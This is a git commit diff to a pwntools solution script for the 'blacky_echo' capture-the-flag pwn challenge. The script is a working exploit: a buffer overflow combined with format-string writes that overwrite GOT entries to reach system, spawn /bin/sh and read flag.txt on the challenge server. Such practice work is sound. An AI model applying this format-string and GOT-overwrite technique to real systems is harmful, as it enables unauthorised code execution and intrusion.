8a550c8aa7617630fd1281a33f6ad32362cda981
Mark-74 <balduccimarco2007@gmail.com>
2024-06-02 11:52:51 +0200

    added Blacky Echo

--- rev-bin-pwn/blacky_echo/sol.py
+++ rev-bin-pwn/blacky_echo/sol.py
@@ -4,16 +4,39 @@ if args.REMOTE:
     r = remote('blacky-echo.challs.olicyber.it', 11002)
 else:
     r = gdb.debug('./blacky_echo', '''
-        b *go
+        b *print_error + 120
         continue
     ''')
 
+libc = ELF('./blacky_echo')
+print('exit: ', libc.symbols['exit'], hex(libc.symbols['exit']))
+print('puts: ', libc.symbols['puts'], hex(libc.symbols['puts']))
+print('system', libc.symbols['system'], hex(libc.symbols['system']))
+                    
 r.recvuntil(b"Size: ")
-r.sendline(b"65580") #Size: 
-
-print(str(int(0x400B54)))
-
-print(str(0x400B + 0x54)) #address of go(), to test need to insert this before %addr$n
+r.sendline(b"65599") #Size of the buffer
 r.recvuntil(b"Input: ")
-r.sendline(b"a"*65546 + p64(0x400B54) + b"%" + p64(0x602088) + b"$n")
-r.interactive()
+
+#p64(0x4008e0) = 0xe008400000000000
+#p64(0x400B54) = 0x540B400000000000
+
+#2879 = int(0x0b54) - 21(num of chars written so far) 
+
+payload = b"%2879x%12$hnAAAAAAA" + p64(0x602088)
+
+r.sendline(b"echo->" + b"a"*65540 + payload)
+
+r.recvuntil(b"Size: ")
+r.sendline(b"65599")
+r.recvuntil(b"Input: ")
+
+payload = b"%43x%12$hhnAAAAAAAA" + p64(0x602020)
+
+r.sendline(b"echo->" + b"a"*65540 + payload)
+
+r.recvuntil(b"Size: ")
+r.sendline(b"65599")
+r.recvuntil(b"Input: ")
+r.sendline(b"ECHO->" + b"/bin/sh")
+r.sendline(b"cat flag.txt")
+print(r.recvline().decode())
